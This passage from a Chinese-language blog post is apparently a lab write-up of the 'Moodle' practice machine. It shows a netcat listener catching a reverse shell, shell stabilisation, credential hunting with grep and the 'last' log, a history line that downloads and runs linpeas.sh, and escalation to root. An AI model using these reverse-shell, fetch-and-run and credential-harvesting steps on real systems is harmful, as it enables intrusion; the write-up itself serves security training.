+<p>成功获取到shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.40] 52924<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure>
+
+<p>稳定shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/bin/script -qc /bin/bash /dev/null<br><span class="hljs-comment"># 按下 Ctrl+Z 将其挂起</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br><span class="hljs-comment"># 按下回车</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure>
+
+<h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取kotori权限"><a href="#1、获取kotori权限" class="headerlink" title="1、获取kotori权限"></a>1、获取kotori权限</h2><p>用户<code>kotori</code>的密码就是<code>pzp5V2Of3akjaJrhRauR.</code> 成功切换到<code>kotori</code>用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Moodle:/home/kotori$ su kotori<br>Password: <br>kotori@Moodle:~$ <span class="hljs-built_in">id</span><br>uid=1000(kotori) gid=1000(kotori) <span class="hljs-built_in">groups</span>=1000(kotori)<br></code></pre></td></tr></table></figure>
+
+<h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><h3 id="1-方案一"><a href="#1-方案一" class="headerlink" title="1-方案一"></a>1-方案一</h3><p>查看<code>/opt</code>目录下面存在<code>hint.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">kotori@Moodle:~$ <span class="hljs-built_in">cat</span> /opt/hint.txt <br>root 的凭证隐藏在众目睽睽之下<br>// ^[a-zA-Z0-9]&#123;20&#125;$<br></code></pre></td></tr></table></figure>
+
+<p>使用正则匹配查询</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -raohE <span class="hljs-string">&#x27;\b[a-zA-Z0-9]&#123;20&#125;\b&#x27;</span> /etc /var/www /opt /home 2&gt;/dev/null &gt;&gt; a.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-方案二"><a href="#2-方案二" class="headerlink" title="2-方案二"></a>2-方案二</h3><p>查看<code>/home</code>目录下的<code>.bash_history</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">kotori@Moodle:~$ <span class="hljs-built_in">cat</span> .bash_history <br>last<br><span class="hljs-built_in">exit</span><br><span class="hljs-built_in">ls</span> al<br><span class="hljs-built_in">ls</span>- al<br>wget 192.168.3.94/linpeas.sh<br>bash linpeas.sh <br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
+
+<p>发现一个<code>last</code>命令，last是Linux系统内置的系统审计与登录历史查询工具</p>
+<p><code>last</code>默认只显示精简的登录记录，要查看详细信息，使用 -F（完整时间）、-i（显示 IP 数字格式）、-w（完整用户名）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">kotori@Moodle:~$ last -F -i -w<br>reboot   system boot  0.0.0.0          Tue Jan 13 01:47:59 2026   still running<br>reboot   system boot  0.0.0.0          Sun Jan 11 21:44:17 2026 - Sun Jan 11 23:56:28 2026  (02:12)<br>root     pts/0        192.168.3.94     Fri Dec 26 23:13:35 2025 - crash                    (15+22:30)<br>reboot   system boot  0.0.0.0          Fri Dec 26 23:13:00 2025 - Sun Jan 11 23:56:28 2026 (16+00:43)<br>sF6Kfzr69w7dyZALAhl6 pts/1        192.168.3.94     Fri Dec 26 22:38:07 2025 - Fri Dec 26 22:38:09 2025  (00:00)<br>root     pts/0        192.168.3.94     Fri Dec 26 22:24:26 2025 - crash                     (00:48)<br>root     pts/0        192.168.3.94     Fri Dec 26 20:12:18 2025 - Fri Dec 26 22:24:20 2025  (02:12)<br>reboot   system boot  0.0.0.0          Fri Dec 26 20:11:53 2025 - Sun Jan 11 23:56:28 2026 (16+03:44)<br>welcome  pts/0        192.168.3.94     Fri Apr 11 22:27:59 2025 - Fri Apr 11 22:28:21 2025  (00:00)<br></code></pre></td></tr></table></figure>
+
+<p>找到<code>root</code>的密码<code>sF6Kfzr69w7dyZALAhl6</code></p>
+<p>切换到<code>root</code>用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">kotori@Moodle:~$ su root<br>Password: <br>root@Moodle:/home/kotori# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure>
+
+<h1 id="五、查看FLAG"><a href="#五、查看FLAG" class="headerlink" title="五、查看FLAG"></a>五、查看FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Moodle:/home/kotori# <span class="hljs-built_in">cat</span> /root/root.txt /home/kotori/user.txt <br>flag&#123;root-ea6233d6aa262b93419775a51a8cc1df&#125;<br>flag&#123;user-de7202216bc84a6aa04762061c9e9ad2&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Maze-sec/" class="category-chain-item">Maze-sec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AD%90%E5%9F%9F%E5%90%8Dburf/" class="print-no-link">#子域名burf</a>
+      
+        <a href="/tags/Moodle/" class="print-no-link">#Moodle</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Mazesec-Moodle</div>
+      <div>http://miao-sec.github.io/Maze-sec/Mazesec-Moodle/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年1月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/Vulnyx/Vlx-Noob/" title="Vlx-Noob">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Vlx-Noob</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Vulnyx/Vlx-Node/" title="Vlx-Node">
+                        <span class="hidden-mobile">Vlx-Node</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
